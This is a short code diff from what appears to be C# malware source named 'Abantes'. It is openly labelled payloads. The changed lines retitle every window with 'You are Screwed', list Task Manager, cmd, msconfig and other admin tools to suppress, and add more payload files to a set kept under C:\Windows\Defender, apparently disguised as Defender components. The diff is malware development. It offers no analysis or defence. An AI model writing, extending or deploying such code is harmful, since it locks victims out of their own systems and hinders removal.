@@ -45,7 +45,7 @@ namespace Abantes.Payloads
             Process[] allProcesses = Process.GetProcesses();
             for (int i = 0; i < allProcesses.Length; i++)
             {
-                SetWindowText(allProcesses[i].MainWindowHandle, "You're Screwed");
+                SetWindowText(allProcesses[i].MainWindowHandle, "You are Screwed");
             }
         }
         public static void MouseTrap()
@@ -548,7 +548,7 @@ namespace Abantes.Payloads
         {
             string[] NeverRun = { "msconfig", "taskmgr", "cmd", "taskschd", "mmc", "resmon" };
             string[] MustRun = { "Rules" };
-            string[] Files = { @"C:\Windows\Defender\Rules.exe", @"C:\Windows\Defender\Abantes.exe" };
+            string[] Files = { @"C:\Windows\Defender\Rules.exe", @"C:\Windows\Defender\Abantes.exe", @"C:\Windows\Defender\Payloads.dll", @"C:\Windows\Defender\IFEO.exe" };
             while (true)
             {
                 Thread.Sleep(1000);
